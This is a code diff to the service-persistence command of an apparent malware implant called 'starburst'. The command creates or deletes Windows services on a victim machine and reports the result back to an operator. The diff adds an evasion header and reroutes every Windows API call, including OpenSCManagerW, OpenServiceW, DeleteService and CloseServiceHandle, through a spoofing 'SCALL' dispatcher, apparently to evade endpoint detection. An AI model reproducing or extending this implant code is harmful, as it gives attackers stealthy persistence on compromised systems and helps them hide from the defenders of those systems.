@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_PERSIST_SERVICE
 
@@ -43,11 +44,11 @@ auto declfn starburst::cmd_persist_service(
 
     // Convert to wide strings for the W-variant APIs
     wchar_t w_name[256] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, name_buf, -1, w_name, 256 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, name_buf, -1, w_name, 256 );
     wchar_t w_display[256] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, display_buf, -1, w_display, 256 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, display_buf, -1, w_display, 256 );
     wchar_t w_binpath[512] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, binpath_buf, -1, w_binpath, 512 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, binpath_buf, -1, w_binpath, 512 );
 
     bool is_install = str_cmp( action_buf,
         symbol<char*>( const_cast<char*>( "install" ) ) ) == 0;
@@ -59,7 +60,7 @@ auto declfn starburst::cmd_persist_service(
             return;
         }
 
-        SC_HANDLE hSCM = inst.advapi32.OpenSCManagerW(
+        SC_HANDLE hSCM = (SC_HANDLE)SCALL( inst, advapi32.OpenSCManagerW,
             nullptr, nullptr, SC_MANAGER_CREATE_SERVICE );
         if ( !hSCM ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -79,14 +80,14 @@ auto declfn starburst::cmd_persist_service(
             nullptr, nullptr, nullptr, nullptr, nullptr );
 
         if ( !hService ) {
-            inst.advapi32.CloseServiceHandle( hSCM );
+            SCALL( inst, advapi32.CloseServiceHandle, hSCM );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
                 symbol<char*>( const_cast<char*>( "CreateServiceW failed" ) ) );
             return;
         }
 
-        inst.advapi32.CloseServiceHandle( hService );
-        inst.advapi32.CloseServiceHandle( hSCM );
+        SCALL( inst, advapi32.CloseServiceHandle, hService );
+        SCALL( inst, advapi32.CloseServiceHandle, hSCM );
 
         char out[320] = { 0 };
         str_copy( out, symbol<char*>( const_cast<char*>(
@@ -96,7 +97,7 @@ auto declfn starburst::cmd_persist_service(
         queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
     } else {
         // remove
-        SC_HANDLE hSCM = inst.advapi32.OpenSCManagerW(
+        SC_HANDLE hSCM = (SC_HANDLE)SCALL( inst, advapi32.OpenSCManagerW,
             nullptr, nullptr, SC_MANAGER_ALL_ACCESS );
         if ( !hSCM ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -104,18 +105,18 @@ auto declfn starburst::cmd_persist_service(
             return;
         }
 
-        SC_HANDLE hService = inst.advapi32.OpenServiceW(
+        SC_HANDLE hService = (SC_HANDLE)SCALL( inst, advapi32.OpenServiceW,
             hSCM, w_name, DELETE );
         if ( !hService ) {
-            inst.advapi32.CloseServiceHandle( hSCM );
+            SCALL( inst, advapi32.CloseServiceHandle, hSCM );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
                 symbol<char*>( const_cast<char*>( "OpenServiceW failed" ) ) );
             return;
         }
 
-        BOOL deleted = inst.advapi32.DeleteService( hService );
-        inst.advapi32.CloseServiceHandle( hService );
-        inst.advapi32.CloseServiceHandle( hSCM );
+        BOOL deleted = (BOOL)SCALL( inst, advapi32.DeleteService, hService );
+        SCALL( inst, advapi32.CloseServiceHandle, hService );
+        SCALL( inst, advapi32.CloseServiceHandle, hSCM );
 
         if ( deleted ) {
             char out[320] = { 0 };
